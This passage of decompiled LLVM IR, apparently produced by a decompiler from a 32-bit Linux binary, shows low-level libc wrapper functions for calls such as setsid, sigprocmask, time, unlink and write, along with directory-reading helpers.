  br i1 %tmp12, label %dec_label_pc_8052431, label %dec_label_pc_8052425

dec_label_pc_8052425:                             ; preds = %dec_label_pc_80523f8
  %v1_8052425 = call i32 @function_8052729(i32 %v0_8052411)
  %v0_805242a = load i32, i32* %esi.global-to-local, align 4
  %v1_805242a = sub i32 0, %v0_805242a
  %v2_805242c = inttoptr i32 %v1_8052425 to i32*
  store i32 %v1_805242a, i32* %v2_805242c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052434.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052431

dec_label_pc_8052431:                             ; preds = %dec_label_pc_80523f8, %dec_label_pc_8052425
  %v2_8052434 = phi i32 [ %v0_80523f9, %dec_label_pc_80523f8 ], [ %v2_8052434.pre, %dec_label_pc_8052425 ]
  %v0_8052431 = phi i32 [ %v1_8052419, %dec_label_pc_80523f8 ], [ -1, %dec_label_pc_8052425 ]
  store i32 %v2_8052434, i32* @esi, align 4
  ret i32 %v0_8052431

; uselistorder directives
  uselistorder i32 %v1_8052419, { 1, 0, 2 }
  uselistorder i32 %v0_8052411, { 1, 0 }
  uselistorder label %dec_label_pc_8052431, { 1, 0 }
}

define i32 @function_8052437() local_unnamed_addr {
dec_label_pc_8052437:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052437 = load i32, i32* @ebx, align 4
  store i32 %v0_8052437, i32* %stack_var_-4, align 4
  %v1_8052440 = call i32 @setsid(i32 %v0_8052437)
  store i32 %v1_8052440, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052440, -4095
  br i1 %tmp7, label %dec_label_pc_8052457, label %dec_label_pc_805244b

dec_label_pc_805244b:                             ; preds = %dec_label_pc_8052437
  %v1_805244b = call i32 @function_8052729(i32 %v0_8052437)
  %v0_8052450 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052450 = sub i32 0, %v0_8052450
  %v2_8052452 = inttoptr i32 %v1_805244b to i32*
  store i32 %v1_8052450, i32* %v2_8052452, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805245b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052457

dec_label_pc_8052457:                             ; preds = %dec_label_pc_8052437, %dec_label_pc_805244b
  %v2_805245b = phi i32 [ %v0_8052437, %dec_label_pc_8052437 ], [ %v2_805245b.pre, %dec_label_pc_805244b ]
  %v0_8052457 = phi i32 [ %v1_8052440, %dec_label_pc_8052437 ], [ -1, %dec_label_pc_805244b ]
  store i32 %v2_805245b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052457

; uselistorder directives
  uselistorder i32 %v1_8052440, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052457, { 1, 0 }
}

define i32 @function_805245d(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805245d:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805245e = load i32, i32* @esi, align 4
  %v4_8052462 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8052462, i32* @ecx, align 4
  %v2_805246e = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805246e, label %dec_label_pc_8052487, label %dec_label_pc_8052472

dec_label_pc_8052472:                             ; preds = %dec_label_pc_805245d
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8052487, label %dec_label_pc_8052477

dec_label_pc_8052477:                             ; preds = %dec_label_pc_8052472
  %v1_8052477 = call i32 @function_8052729(i32 %v0_805245e)
  %v1_805247c = inttoptr i32 %v1_8052477 to i32*
  store i32 22, i32* %v1_805247c, align 4
  br label %dec_label_pc_80524ae

dec_label_pc_8052487:                             ; preds = %dec_label_pc_8052472, %dec_label_pc_805245d
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805248c = load i32, i32* @ebx, align 4
  %v7_8052494 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805248c, i32* @ebx, align 4
  store i32 %v7_8052494, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8052494, -4095
  br i1 %tmp12, label %dec_label_pc_80524ae, label %dec_label_pc_80524a0

dec_label_pc_80524a0:                             ; preds = %dec_label_pc_8052487
  %v1_80524a0 = call i32 @function_8052729(i32 %v0_805248c)
  %v0_80524a5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80524a5 = sub i32 0, %v0_80524a5
  %v2_80524a7 = inttoptr i32 %v1_80524a0 to i32*
  store i32 %v1_80524a5, i32* %v2_80524a7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524ae

dec_label_pc_80524ae:                             ; preds = %dec_label_pc_80524a0, %dec_label_pc_8052487, %dec_label_pc_8052477
  %storemerge = phi i32 [ -1, %dec_label_pc_8052477 ], [ %v7_8052494, %dec_label_pc_8052487 ], [ -1, %dec_label_pc_80524a0 ]
  %v2_80524ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524ae, i32* @edx, align 4
  store i32 %v0_805245e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8052494, { 1, 0, 2 }
  uselistorder i32 %v0_805248c, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80524b2(i32* %arg1) local_unnamed_addr {
dec_label_pc_80524b2:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524b2 = load i32, i32* @edi, align 4
  store i32 %v0_80524b2, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_80524ba = load i32, i32* @ebx, align 4
  %v2_80524c2 = call i32 @time(i32* %arg1)
  store i32 %v0_80524ba, i32* @ebx, align 4
  store i32 %v2_80524c2, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_80524c2, -4095
  br i1 %tmp10, label %dec_label_pc_80524da, label %dec_label_pc_80524ce

dec_label_pc_80524ce:                             ; preds = %dec_label_pc_80524b2
  %v1_80524ce = call i32 @function_8052729(i32 %v0_80524ba)
  %v0_80524d3 = load i32, i32* %edi.global-to-local, align 4
  %v1_80524d3 = sub i32 0, %v0_80524d3
  %v2_80524d5 = inttoptr i32 %v1_80524ce to i32*
  store i32 %v1_80524d3, i32* %v2_80524d5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80524de.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524da

dec_label_pc_80524da:                             ; preds = %dec_label_pc_80524b2, %dec_label_pc_80524ce
  %v2_80524de = phi i32 [ %v0_80524b2, %dec_label_pc_80524b2 ], [ %v2_80524de.pre, %dec_label_pc_80524ce ]
  %v0_80524da = phi i32 [ %v2_80524c2, %dec_label_pc_80524b2 ], [ -1, %dec_label_pc_80524ce ]
  %v2_80524dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524dc, i32* @edx, align 4
  store i32 %v2_80524de, i32* @edi, align 4
  ret i32 %v0_80524da

; uselistorder directives
  uselistorder i32 %v2_80524c2, { 1, 0, 2 }
  uselistorder i32 %v0_80524ba, { 1, 0 }
  uselistorder label %dec_label_pc_80524da, { 1, 0 }
}

define i32 @function_80524e0() local_unnamed_addr {
dec_label_pc_80524e0:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80524e0 = load i32, i32* @edi, align 4
  store i32 %v0_80524e0, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_80524e8 = load i32, i32* @ebx, align 4
  %v1_80524e9 = inttoptr i32 %tmp to i8*
  %v3_80524f0 = call i32 @unlink(i8* %v1_80524e9)
  store i32 %v0_80524e8, i32* @ebx, align 4
  store i32 %v3_80524f0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80524f0, -4095
  br i1 %tmp9, label %dec_label_pc_8052508, label %dec_label_pc_80524fc

dec_label_pc_80524fc:                             ; preds = %dec_label_pc_80524e0
  %v1_80524fc = call i32 @function_8052729(i32 %v0_80524e8)
  %v0_8052501 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052501 = sub i32 0, %v0_8052501
  %v2_8052503 = inttoptr i32 %v1_80524fc to i32*
  store i32 %v1_8052501, i32* %v2_8052503, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805250c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052508

dec_label_pc_8052508:                             ; preds = %dec_label_pc_80524e0, %dec_label_pc_80524fc
  %v2_805250c = phi i32 [ %v0_80524e0, %dec_label_pc_80524e0 ], [ %v2_805250c.pre, %dec_label_pc_80524fc ]
  %v0_8052508 = phi i32 [ %v3_80524f0, %dec_label_pc_80524e0 ], [ -1, %dec_label_pc_80524fc ]
  store i32 %v2_805250c, i32* @edi, align 4
  ret i32 %v0_8052508

; uselistorder directives
  uselistorder i32 %v3_80524f0, { 1, 0, 2 }
  uselistorder i32 %v0_80524e8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052508, { 1, 0 }
}

define i32 @function_805250e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805250e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805250e = load i32, i32* @edi, align 4
  store i32 %v0_805250e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805251e = load i32, i32* @ebx, align 4
  %v4_8052526 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8052526, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052526, -4095
  br i1 %tmp12, label %dec_label_pc_805253e, label %dec_label_pc_8052532

dec_label_pc_8052532:                             ; preds = %dec_label_pc_805250e
  %v1_8052532 = call i32 @function_8052729(i32 %v0_805251e)
  %v0_8052537 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052537 = sub i32 0, %v0_8052537
  %v2_8052539 = inttoptr i32 %v1_8052532 to i32*
  store i32 %v1_8052537, i32* %v2_8052539, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052542.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805253e

dec_label_pc_805253e:                             ; preds = %dec_label_pc_805250e, %dec_label_pc_8052532
  %v2_8052542 = phi i32 [ %v0_805250e, %dec_label_pc_805250e ], [ %v2_8052542.pre, %dec_label_pc_8052532 ]
  %v0_805253e = phi i32 [ %v4_8052526, %dec_label_pc_805250e ], [ -1, %dec_label_pc_8052532 ]
  store i32 %v2_8052542, i32* %edi.global-to-local, align 4
  ret i32 %v0_805253e

; uselistorder directives
  uselistorder i32 %v4_8052526, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805253e, { 1, 0 }
}

define i32 @function_8052544() local_unnamed_addr {
dec_label_pc_8052544:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8052544 = load i32, i32* @edi, align 4
  %v0_8052545 = load i32, i32* @esi, align 4
  %v0_8052546 = load i32, i32* @ebx, align 4
  %v12_8052547 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_805254e = inttoptr i32 %tmp to i32*
  %v2_805254e = load i32, i32* %v1_805254e, align 4
  %v12_805254e = icmp eq i32 %v2_805254e, -1
  %v1_8052551 = icmp eq i1 %v12_805254e, false
  br i1 %v1_8052551, label %dec_label_pc_8052563, label %dec_label_pc_8052553

dec_label_pc_8052553:                             ; preds = %dec_label_pc_8052544
  %v1_8052553 = call i32 @function_8052729(i32 %v0_8052546)
  %v1_8052558 = inttoptr i32 %v1_8052553 to i32*
  store i32 9, i32* %v1_8052558, align 4
  br label %dec_label_pc_80525ad

dec_label_pc_8052563:                             ; preds = %dec_label_pc_8052544
  %v1_8052563 = add i32 %tmp, 24
  store i32 %v12_8052547, i32* @esi, align 4
  %v2_8052572 = call i32 @function_80540b0(i32 %v12_8052547, i32 134561965)
  %v1_805257a = call i32 @function_80540ad(i32 %v1_8052563)
  store i32 %v1_805257a, i32* @eax, align 4
  %v0_805257f = load i32, i32* @edi, align 4
  %v1_805257f = inttoptr i32 %v0_805257f to i32*
  %v2_805257f = load i32, i32* %v1_805257f, align 4
  store i32 %v2_805257f, i32* @ebx, align 4
  store i32 -1, i32* %v1_805257f, align 4
  %v2_805258c = call i32 @function_80540b0(i32 %v12_8052547, i32 1)
  %v0_8052592 = load i32, i32* @edi, align 4
  %v1_8052592 = add i32 %v0_8052592, 12
  %v2_8052592 = inttoptr i32 %v1_8052592 to i32*
  %v3_8052592 = load i32, i32* %v2_8052592, align 4
  %v1_8052595 = call i32 @function_8053949(i32 %v3_8052592)
  %v0_805259a = load i32, i32* @edi, align 4
  %v1_805259d = call i32 @function_8053949(i32 %v0_805259a)
  %v0_80525a2 = load i32, i32* @ebx, align 4
  %v1_80525a5 = call i32 @function_80521f1(i32 %v0_80525a2)
  br label %dec_label_pc_80525ad

dec_label_pc_80525ad:                             ; preds = %dec_label_pc_8052553, %dec_label_pc_8052563
  %v0_80525b3 = phi i32 [ -1, %dec_label_pc_8052553 ], [ %v1_80525a5, %dec_label_pc_8052563 ]
  store i32 %v0_8052546, i32* @ebx, align 4
  store i32 %v0_8052545, i32* @esi, align 4
  store i32 %v0_8052544, i32* @edi, align 4
  ret i32 %v0_80525b3

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80525ad, { 1, 0 }
}

define i32 @function_80525b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80525b4:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80525b4 = load i32, i32* @edi, align 4
  %v0_80525b6 = load i32, i32* @ebx, align 4
  store i32 %v0_80525b6, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_80525c5 = inttoptr i32 %arg1 to i8*
  %v3_80525c5 = call i32 @function_8052302(i8* %v2_80525c5, i32 67584)
  store i32 %v3_80525c5, i32* %eax.global-to-local, align 4
  store i32 %v3_80525c5, i32* @edi, align 4
  %v2_80525cf = icmp slt i32 %v3_80525c5, 0
  br i1 %v2_80525cf, label %dec_label_pc_805269c, label %dec_label_pc_80525d7

dec_label_pc_80525d7:                             ; preds = %dec_label_pc_80525b4
  %v0_80525d7 = load i32, i32* @ebx, align 4
  %v2_80525d9 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_80525d9, i32* %eax.global-to-local, align 4
  store i32 %v3_80525c5, i32* %stack_var_-124, align 4
  %v4_80525df = call i32 @function_80544aa(i32 %v3_80525c5, i32 %v2_80525d9, i32 %v0_80525d7, i32 %v0_80525d7)
  store i32 %v4_80525df, i32* %eax.global-to-local, align 4
  %v2_80525e7 = icmp slt i32 %v4_80525df, 0
  br i1 %v2_80525e7, label %dec_label_pc_80525fd, label %dec_label_pc_80525eb

dec_label_pc_80525eb:                             ; preds = %dec_label_pc_80525d7
  %v0_80525f0 = load i32, i32* @edi, align 4
  store i32 %v0_80525f0, i32* %stack_var_-124, align 4
  %v3_80525f1 = call i32 @function_805212d(i32 %v0_80525f0, i32 2, i32 1)
  store i32 %v3_80525f1, i32* %eax.global-to-local, align 4
  %v2_80525f9 = icmp slt i32 %v3_80525f1, 0
  %v1_80525fb = icmp eq i1 %v2_80525f9, false
  br i1 %v1_80525fb, label %dec_label_pc_8052613, label %dec_label_pc_80525fd

dec_label_pc_80525fd:                             ; preds = %dec_label_pc_80525eb, %dec_label_pc_80525d7
  %v0_80525fd = load i32, i32* %stack_var_-124, align 4
  %v1_80525fd = call i32 @function_8052729(i32 %v0_80525fd)
  store i32 %v1_80525fd, i32* %eax.global-to-local, align 4
  store i32 %v1_80525fd, i32* @ebx, align 4
  %v1_8052607 = inttoptr i32 %v1_80525fd to i32*
  %v2_8052607 = load i32, i32* %v1_8052607, align 4
  %v0_8052609 = load i32, i32* @edi, align 4
  store i32 %v0_8052609, i32* %stack_var_-124, align 4
  %v1_805260a = call i32 @function_80521f1(i32 %v0_8052609)
  store i32 %v1_805260a, i32* %eax.global-to-local, align 4
  %v1_805260f = load i32, i32* @ebx, align 4
  %v2_805260f = inttoptr i32 %v1_805260f to i32*
  store i32 %v2_8052607, i32* %v2_805260f, align 4
  br label %dec_label_pc_8052688

dec_label_pc_8052613:                             ; preds = %dec_label_pc_80525eb
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8052618 = call i32 @function_8052b84(i32 48)
  store i32 %v1_8052618, i32* %eax.global-to-local, align 4
  store i32 %v1_8052618, i32* @ebx, align 4
  %v1_8052622 = icmp eq i32 %v1_8052618, 0
  br i1 %v1_8052622, label %dec_label_pc_8052674, label %dec_label_pc_8052626

dec_label_pc_8052626:                             ; preds = %dec_label_pc_8052613
  %v0_8052626 = load i32, i32* @edi, align 4
  %v2_8052626 = inttoptr i32 %v1_8052618 to i32*
  store i32 %v0_8052626, i32* %v2_8052626, align 4
  %v1_8052628 = add i32 %v1_8052618, 16
  %v2_8052628 = inttoptr i32 %v1_8052628 to i32*
  store i32 0, i32* %v2_8052628, align 4
  %v1_805262f = add i32 %v1_8052618, 8
  %v2_805262f = inttoptr i32 %v1_805262f to i32*
  store i32 0, i32* %v2_805262f, align 4
  %v1_8052636 = add i32 %v1_8052618, 4
  %v2_8052636 = inttoptr i32 %v1_8052636 to i32*
  store i32 0, i32* %v2_8052636, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8052641 = load i32, i32* @ebx, align 4
  %v2_8052641 = add i32 %v1_8052641, 20
  %v3_8052641 = inttoptr i32 %v2_8052641 to i32*
  store i32 %tmp, i32* %v3_8052641, align 4
  %v0_8052644 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052649 = icmp ugt i32 %v0_8052644, 511
  br i1 %v6_8052649, label %dec_label_pc_8052652, label %dec_label_pc_805264b

dec_label_pc_805264b:                             ; preds = %dec_label_pc_8052626
  %v0_805264b = load i32, i32* @ebx, align 4
  %v1_805264b = add i32 %v0_805264b, 20
  %v2_805264b = inttoptr i32 %v1_805264b to i32*
  store i32 512, i32* %v2_805264b, align 4
  br label %dec_label_pc_8052652

dec_label_pc_8052652:                             ; preds = %dec_label_pc_8052626, %dec_label_pc_805264b
  %v0_8052654 = load i32, i32* @ebx, align 4
  %v1_8052654 = add i32 %v0_8052654, 20
  %v2_8052654 = inttoptr i32 %v1_8052654 to i32*
  %v3_8052654 = load i32, i32* %v2_8052654, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_8052659 = call i32 @function_80532f8(i64 1, i32 %v3_8052654)
  store i32 %v3_8052659, i32* %eax.global-to-local, align 4
  %v1_8052661 = load i32, i32* @ebx, align 4
  %v2_8052661 = add i32 %v1_8052661, 12
  %v3_8052661 = inttoptr i32 %v2_8052661 to i32*
  store i32 %v3_8052659, i32* %v3_8052661, align 4
  %v1_8052664 = icmp eq i32 %v3_8052659, 0
  %v1_8052666 = icmp eq i1 %v1_8052664, false
  br i1 %v1_8052666, label %dec_label_pc_805268c, label %dec_label_pc_8052668

dec_label_pc_8052668:                             ; preds = %dec_label_pc_8052652
  %v0_805266b = load i32, i32* @ebx, align 4
  store i32 %v0_805266b, i32* %stack_var_-124, align 4
  %v1_805266c = call i32 @function_8053949(i32 %v0_805266b)
  store i32 %v1_805266c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052674

dec_label_pc_8052674:                             ; preds = %dec_label_pc_8052613, %dec_label_pc_8052668
  %v0_8052677 = load i32, i32* @edi, align 4
  store i32 %v0_8052677, i32* %stack_var_-124, align 4
  %v1_8052678 = call i32 @function_80521f1(i32 %v0_8052677)
  store i32 %v1_8052678, i32* %eax.global-to-local, align 4
  %v1_805267d = call i32 @function_8052729(i32 %v0_8052677)
  store i32 %v1_805267d, i32* %eax.global-to-local, align 4
  %v1_8052682 = inttoptr i32 %v1_805267d to i32*
  store i32 12, i32* %v1_8052682, align 4
  br label %dec_label_pc_8052688

dec_label_pc_8052688:                             ; preds = %dec_label_pc_80525fd, %dec_label_pc_8052674
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052699

dec_label_pc_805268c:                             ; preds = %dec_label_pc_8052652
  %v0_805268e = load i32, i32* @ebx, align 4
  %v1_805268e = add i32 %v0_805268e, 24
  store i32 %v1_805268e, i32* %eax.global-to-local, align 4
  store i32 %v1_805268e, i32* %stack_var_-124, align 4
  %v1_8052694 = call i32 @function_80540ad(i32 %v1_805268e)
  store i32 %v1_8052694, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052699

dec_label_pc_8052699:                             ; preds = %dec_label_pc_8052688, %dec_label_pc_805268c
  %v2_80526a1.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805269c

dec_label_pc_805269c:                             ; preds = %dec_label_pc_80525b4, %dec_label_pc_8052699
  %v2_80526a1 = phi i32 [ %v0_80525b6, %dec_label_pc_80525b4 ], [ %v2_80526a1.pre, %dec_label_pc_8052699 ]
  %v0_805269f = load i32, i32* @ebx, align 4
  store i32 %v0_805269f, i32* %eax.global-to-local, align 4
  store i32 %v2_80526a1, i32* @ebx, align 4
  store i32 %v0_80525b4, i32* @edi, align 4
  ret i32 %v0_805269f

; uselistorder directives
  uselistorder i32 %v3_8052659, { 1, 0, 2 }
  uselistorder i32 %v1_8052618, { 0, 3, 5, 4, 2, 1, 6 }
  uselistorder i32 %v1_80525fd, { 1, 0, 2 }
  uselistorder i32 %v3_80525c5, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_80532f8, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_80521f1, { 12, 11, 10, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 3, 5, 9, 8, 7, 6, 4, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805269c, { 1, 0 }
  uselistorder label %dec_label_pc_8052699, { 1, 0 }
  uselistorder label %dec_label_pc_8052688, { 1, 0 }
  uselistorder label %dec_label_pc_8052674, { 1, 0 }
  uselistorder label %dec_label_pc_8052652, { 1, 0 }
}

define i32 @function_80526a5() local_unnamed_addr {
dec_label_pc_80526a5:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80526a5 = load i32, i32* @esi, align 4
  %v0_80526a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80526a6, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_80526ae = add i32 %tmp, 24
  store i32 %v1_80526ae, i32* @ebx, align 4
  %v2_80526b7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80526b7, i32* @eax, align 4
  %v2_80526bc = call i32 @function_80540b0(i32 %v2_80526b7, i32 134561965)
  %v0_80526c1 = load i32, i32* @ebx, align 4
  %v1_80526c4 = call i32 @function_80540ad(i32 %v0_80526c1)
  br label %dec_label_pc_80526cc

dec_label_pc_80526cc:                             ; preds = %dec_label_pc_80526f7, %dec_label_pc_80526a5
  %v0_80526cc = load i32, i32* @esi, align 4
  %v1_80526cc = add i32 %v0_80526cc, 8
  %v2_80526cc = inttoptr i32 %v1_80526cc to i32*
  %v3_80526cc = load i32, i32* %v2_80526cc, align 4
  %v2_80526cf = add i32 %v0_80526cc, 4
  %v3_80526cf = inttoptr i32 %v2_80526cf to i32*
  %v4_80526cf = load i32, i32* %v3_80526cf, align 4
  %v6_80526d2 = icmp ugt i32 %v3_80526cc, %v4_80526cf
  br i1 %v6_80526d2, label %dec_label_pc_80526f7, label %dec_label_pc_80526d4

dec_label_pc_80526d4:                             ; preds = %dec_label_pc_80526cc
  %v0_80526d4 = load i32, i32* @edx, align 4
  %v1_80526d5 = add i32 %v0_80526cc, 20
  %v2_80526d5 = inttoptr i32 %v1_80526d5 to i32*
  %v3_80526d5 = load i32, i32* %v2_80526d5, align 4
  %v1_80526d8 = add i32 %v0_80526cc, 12
  %v2_80526d8 = inttoptr i32 %v1_80526d8 to i32*
  %v3_80526d8 = load i32, i32* %v2_80526d8, align 4
  %v1_80526db = inttoptr i32 %v0_80526cc to i32*
  %v2_80526db = load i32, i32* %v1_80526db, align 4
  %v4_80526dd = call i32 @function_80544f2(i32 %v2_80526db, i32 %v3_80526d8, i32 %v3_80526d5, i32 %v0_80526d4)
  %tmp12 = icmp slt i32 %v4_80526dd, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_80526ed, label %dec_label_pc_80526e9

dec_label_pc_80526e9:                             ; preds = %dec_label_pc_80526d4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052713

dec_label_pc_80526ed:                             ; preds = %dec_label_pc_80526d4
  %v1_80526ed = load i32, i32* @esi, align 4
  %v2_80526ed = add i32 %v1_80526ed, 8
  %v3_80526ed = inttoptr i32 %v2_80526ed to i32*
  store i32 %v4_80526dd, i32* %v3_80526ed, align 4
  %v0_80526f0 = load i32, i32* @esi, align 4
  %v1_80526f0 = add i32 %v0_80526f0, 4
  %v2_80526f0 = inttoptr i32 %v1_80526f0 to i32*
  store i32 0, i32* %v2_80526f0, align 4
  %v0_80526f7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526f7

dec_label_pc_80526f7:                             ; preds = %dec_label_pc_80526cc, %dec_label_pc_80526ed
  %v1_8052705 = phi i32 [ %v0_80526cc, %dec_label_pc_80526cc ], [ %v0_80526f7.pre, %dec_label_pc_80526ed ]
  %v1_80526f7 = add i32 %v1_8052705, 4
  %v2_80526f7 = inttoptr i32 %v1_80526f7 to i32*
  %v3_80526f7 = load i32, i32* %v2_80526f7, align 4
  %v2_80526fc = add i32 %v1_8052705, 12
  %v3_80526fc = inttoptr i32 %v2_80526fc to i32*
  %v4_80526fc = load i32, i32* %v3_80526fc, align 4
  %v5_80526fc = add i32 %v4_80526fc, %v3_80526f7
  store i32 %v5_80526fc, i32* @ebx, align 4
  %v1_80526ff = add i32 %v5_80526fc, 8
  %v2_80526ff = inttoptr i32 %v1_80526ff to i16*
  %v3_80526ff = load i16, i16* %v2_80526ff, align 2
  %v4_80526ff = zext i16 %v3_80526ff to i32
  store i32 %v4_80526ff, i32* @edx, align 4
  %v2_8052703 = add i32 %v4_80526ff, %v3_80526f7
  store i32 %v2_8052703, i32* %v2_80526f7, align 4
  %v0_8052708 = load i32, i32* @ebx, align 4
  %v1_8052708 = add i32 %v0_8052708, 4
  %v2_8052708 = inttoptr i32 %v1_8052708 to i32*
  %v3_8052708 = load i32, i32* %v2_8052708, align 4
  %v1_805270b = load i32, i32* @esi, align 4
  %v2_805270b = add i32 %v1_805270b, 16
  %v3_805270b = inttoptr i32 %v2_805270b to i32*
  store i32 %v3_8052708, i32* %v3_805270b, align 4
  %v0_805270e = load i32, i32* @ebx, align 4
  %v1_805270e = inttoptr i32 %v0_805270e to i32*
  %v2_805270e = load i32, i32* %v1_805270e, align 4
  %v3_805270e = icmp eq i32 %v2_805270e, 0
  br i1 %v3_805270e, label %dec_label_pc_80526cc, label %dec_label_pc_8052713.loopexit

dec_label_pc_8052713.loopexit:                    ; preds = %dec_label_pc_80526f7
  br label %dec_label_pc_8052713

dec_label_pc_8052713:                             ; preds = %dec_label_pc_8052713.loopexit, %dec_label_pc_80526e9
  store i32 %v2_80526b7, i32* @eax, align 4
  %v2_805271c = call i32 @function_80540b0(i32 %v2_80526b7, i32 1)
  %v0_8052721 = load i32, i32* @ebx, align 4
  %v2_8052726 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052726, i32* @ebx, align 4
  store i32 %v0_80526a5, i32* @esi, align 4
  ret i32 %v0_8052721

; uselistorder directives
  uselistorder i32 %v1_8052705, { 1, 0 }
  uselistorder i32 %v0_80526cc, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_80526f7, { 1, 0 }
}

define i32 @function_8052729(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052729:
  ret i32 ptrtoint (i32* @global_var_8056954.203 to i32)
}

define i32 @function_805272f() local_unnamed_addr {
dec_label_pc_805272f:
  %tmp = call i64 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %v1_8052737 = bitcast i32* %stack_var_-16 to %tms*
  %v2_8052737 = call i32 @function_80548c7(%tms* %v1_8052737)
  %v4_805273c = trunc i64 %tmp to i32
  %v4_8052740 = load i32, i32* %stack_var_-16, align 4
  %v5_8052740 = add i32 %v4_8052740, %v4_805273c
  %v3_8052747 = mul i32 %v5_8052740, 10000
  %v1_805274d = and i32 %v3_8052747, 2147483632
  ret i32 %v1_805274d
